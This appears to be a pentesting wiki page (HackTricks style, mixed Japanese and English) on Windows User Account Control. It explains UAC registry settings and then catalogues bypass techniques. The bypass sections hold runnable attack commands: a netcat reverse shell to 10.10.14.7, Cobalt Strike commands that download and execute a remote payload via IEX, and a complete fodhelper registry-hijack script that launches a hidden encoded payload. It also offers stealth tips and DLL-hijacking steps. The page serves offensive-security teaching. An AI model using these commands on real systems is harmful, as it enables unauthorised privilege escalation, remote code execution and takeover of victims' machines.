# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) は、昇格が必要な操作に対して **同意プロンプトを表示する** 機能です。アプリケーションは異なる `integrity` レベルを持ち、**高いレベル** のプログラムは **システムを危険にさらす可能性のある操作** を実行できます。UAC が有効な場合、アプリケーションやタスクは、管理者が明示的にそのアプリケーション/タスクに管理者レベルのアクセスを許可して実行する場合を除き、常に **非管理者アカウントのセキュリティコンテキストで実行されます**。これは管理者を意図しない変更から守る利便機能ですが、セキュリティ境界とは見なされません。

For more info about integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC が有効な場合、管理者ユーザーには 2 つのトークンが付与されます: 標準ユーザー用のトークン（通常の操作を行うため）と、管理者権限を持つトークンです。

この [ページ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) は UAC の動作（ログオンプロセス、ユーザー体験、UAC アーキテクチャ）を詳しく説明しています。管理者はセキュリティポリシーを使用して組織固有に UAC の動作をローカルレベル（secpol.msc を使用）で構成したり、Active Directory ドメイン環境では Group Policy Objects (GPO) を介して配布・適用することができます。各種設定の詳細は [こちら](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) を参照してください。UAC に設定できる Group Policy は 10 個あります。以下の表は追加の詳細を示します：

| Group Policy 設定                                                                                                                                                                                                                                                                                                                                                          | Registry Key                | デフォルト設定                                                 |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | 無効                                                         |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | 無効                                                         |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | 非Windowsバイナリに対して同意を求める                        |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | セキュアデスクトップで資格情報を要求する                     |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | 有効（Home のデフォルト） 無効（Enterprise のデフォルト）     |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | 無効                                                         |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | 有効                                                         |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | 有効                                                         |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | 有効                                                         |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | 有効                                                         |

### UAC Bypass Theory

いくつかのプログラムは、**ユーザーが管理者グループに属している**場合に **自動的にオートエレベートされる（autoelevated）** ことがあります。これらのバイナリは内部の _**Manifests**_ に _**autoElevate**_ オプションが _**True**_ に設定されています。バイナリは **Microsoft によって署名されている** 必要もあります。

多くの auto-elevate プロセスは **COM オブジェクトや RPC サーバー経由で機能を公開**しており、これらは中間整合性（通常のユーザーレベル）で実行されているプロセスから呼び出すことができます。ここで、COM (Component Object Model) や RPC (Remote Procedure Call) は、Windows プログラムが異なるプロセス間で通信や処理実行を行うための手段です。例えば、**`IFileOperation COM object`** はファイル操作（コピー、削除、移動）を扱うために設計されており、プロンプトなしで自動的に権限を昇格させることができます。

プロセスが **System32 directory** から実行されたかどうかをチェックするような検査が行われる場合があり、これは例えば **explorer.exe に注入する** や他の System32 配下の実行ファイルに注入することで回避できます。

これらのチェックを回避する別の方法として **PEB を改変する** ことがあります。Windows のすべてのプロセスには Process Environment Block (PEB) が存在し、実行ファイルのパスなどプロセスに関する重要なデータを含んでいます。PEB を改変することで、攻撃者は自分の悪意あるプロセスの場所を偽装（spoof）し、信頼されたディレクトリ（例えば system32）から実行されているように見せかけることができます。この偽装された情報が COM オブジェクトを騙して、ユーザーにプロンプトを表示させずに自動的に昇格させる原因となります。

その後、UAC を **バイパス**（中間整合性レベルから 高い整合性レベル へ昇格）するために、攻撃者はこの種のバイナリを利用して **任意のコードを実行** することがあります。なぜならそのコードは **高い整合性レベルのプロセス** から実行されるためです。

バイナリの _**Manifest**_ を確認するには、Sysinternals のツール _**sigcheck.exe**_ を使用できます。(`sigcheck.exe -m <file>`) また、プロセスの **integrity level** は _Process Explorer_ や _Process Monitor_（Sysinternals）で確認できます。

### Check UAC

UAC が有効か確認するには、次を実行してください：
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
もし **`1`** なら UAC は **有効**、**`0`** であるか **存在しない** 場合は UAC は **無効**。

次に、**どのレベル**が設定されているかを確認します:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- If **`0`** の場合、UAC はプロンプトを表示しません（**無効**のように）
- If **`1`** の場合、管理者は高い権限でバイナリを実行するために**ユーザー名とパスワードを要求される**（on Secure Desktop）
- If **`2`**（**Always notify me**）の場合、管理者が高権限で何かを実行しようとすると UAC は常に確認を求めます（on Secure Desktop）
- If **`3`** は `1` と同様ですが Secure Desktop では必須ではありません
- If **`4`** は `2` と同様ですが Secure Desktop では必須ではありません
- if **`5`**（**default**）の場合、Windows 以外のバイナリを高権限で実行する際に管理者の確認を求めます

Then, you have to take a look at the value of **`LocalAccountTokenFilterPolicy`**\
If the value is **`0`**, then, only the **RID 500** user (**built-in Administrator**) is able to perform **admin tasks without UAC**, and if its `1`, **all accounts inside "Administrators"** group can do them.

And, finally take a look at the value of the key **`FilterAdministratorToken`**\
If **`0`**(default), the **built-in Administrator account can** do remote administration tasks and if **`1`** the built-in account Administrator **cannot** do remote administration tasks, unless `LocalAccountTokenFilterPolicy` is set to `1`.

#### Summary

- If `EnableLUA=0` or **doesn't exist**, **no UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , No UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, No UAC for RID 500 (Built-in Administrator)**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, UAC for everyone**

All this information can be gathered using the **metasploit** module: `post/windows/gather/win_privs`

You can also check the groups of your user and get the integrity level:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> 被害者にグラフィカルなアクセスがある場合、UAC bypass は簡単で、UAC プロンプトが表示されたら単に "Yes" をクリックするだけです

The UAC bypass is needed in the following situation: **UAC が有効で、プロセスが medium integrity コンテキストで実行されており、ユーザが administrators グループに属している**。

It is important to mention that it is **UAC が最も高いセキュリティレベル (Always) に設定されている場合、他のいずれのレベル (Default) に比べて UAC をバイパスするのがはるかに難しい**。

### UAC disabled

If UAC is already disabled (`ConsentPromptBehaviorAdmin` is **`0`**) you can **execute a reverse shell with admin privileges** (high integrity level) using something like:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **非常に** 基本的な UAC "bypass" (full file system access)

If you have a shell with a user that is inside the Administrators group you can **mount the C$** shared via SMB (file system) local in a new disk and you will have **access to everything inside the file system** (even Administrator home folder).

> [!WARNING]
> **このトリックはもう動作しないようです**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### cobalt strike を用いた UAC bypass

Cobalt Strike の手法は、UAC が最大のセキュリティレベルに設定されていない場合にのみ動作します。
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** と **Metasploit** には **bypass** を行う **UAC** のモジュールがいくつかあります。

### KRBUACBypass

ドキュメントとツールは [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass) にあります。

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) は複数の UAC bypass エクスプロイトの **コンパイル** です。注意：**UACME を visual studio または msbuild でコンパイルする必要があります**。コンパイルによりいくつかの実行可能ファイル（例: `Source\Akagi\outout\x64\Debug\Akagi.exe`）が生成されるため、**どれが必要かを把握する必要があります。**\

一部の bypass は **他のプログラムを起動させ**、それが **ユーザー** に **警告** を出すことがあるため、**注意してください**。

UACME には **各手法が動作し始めたビルドバージョン** が記載されています。自分のバージョンに影響する手法を検索できます:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
また、[this](https://en.wikipedia.org/wiki/Windows_10_version_history) ページを使うと、ビルドバージョンから Windows リリース `1607` が分かります。

### UAC Bypass – fodhelper.exe (Registry hijack)

信頼されたバイナリ `fodhelper.exe` は現代の Windows で自動的に昇格されます。起動時に、`DelegateExecute` 動詞を検証せずに以下の per-user レジストリパスを参照します。そこにコマンドを仕込むと、Medium Integrity プロセス（ユーザが Administrators）から UAC プロンプトなしで High Integrity プロセスを生成できます。

fodhelper が参照するレジストリパス：
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
PowerShell の手順（payload を設定してから trigger を実行）:
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Notes:
- 現在のユーザが Administrators のメンバーで、UAC レベルがデフォルト/寛容（Always Notify の追加制限ではない）である場合に動作します。
- 64-bit Windows 上の 32-bit プロセスから 64-bit PowerShell を起動するには `sysnative` パスを使用してください。
- Payload は任意のコマンド（PowerShell、cmd、または EXE パス）にできます。ステルスのためにプロンプトを表示する UI は避けてください。

#### More UAC bypass

**All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).

You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ should works)

### UAC Bypass with GUI

GUI にアクセスできる場合は、UAC プロンプトが出たときに単に受諾すればよく、必ずしも bypass は必要ありません。つまり、GUI へのアクセスを得られれば UAC を回避できます。

さらに、誰かが使っている GUI セッション（RDP 経由の可能性あり）を取得できれば、そこでは **administrator として実行されているツール** が存在し、例えばそこから **cmd** を **as admin** で直接実行でき、UAC による再プロンプトが発生しない場合があります。例: [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)。これは多少 **stealthy** かもしれません。

### Noisy brute-force UAC bypass

ノイジーでも構わないなら、いつでも [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) のようなものを **実行して** ユーザが承諾するまで権限昇格を要求し続けることができます。

### Your own bypass - Basic UAC bypass methodology

**UACME** を見れば分かるように、**most UAC bypasses abuse a Dll Hijacking vulnerabilit**y（主に悪意のある dll を _C:\Windows\System32_ に書き込む）ことが多いです。[Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html)。

1. 実行すると high integrity level で動作するような **autoelevate** するバイナリを見つける。
2. procmon を使い、**NAME NOT FOUND** イベントを探して **DLL Hijacking** の脆弱になりうる箇所を特定する。
3. 悪意の DLL を書き込むために、書き込み権限がない **protected paths**（例えば C:\Windows\System32）に書き込む必要がある場合が多い。これをバイパスする方法としては:
   1. **wusa.exe**: Windows 7,8 and 8.1。CAB ファイルの内容を protected paths に展開できる（このツール自体が high integrity level で実行されるため）。
   2. **IFileOperation**: Windows 10。
4. DLL を protected path にコピーして、脆弱で autoelevated なバイナリを実行するスクリプトを用意する。

### Another UAC bypass technique

autoElevated なバイナリが、実行する **binary** や **command** の **name/path** をレジストリから **read** しようとするかどうかを監視する手法です（バイナリがこの情報を **HKCU** 内で探す場合に特に興味深い）。

## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)

{{#include ../../banners/hacktricks-training.md}}
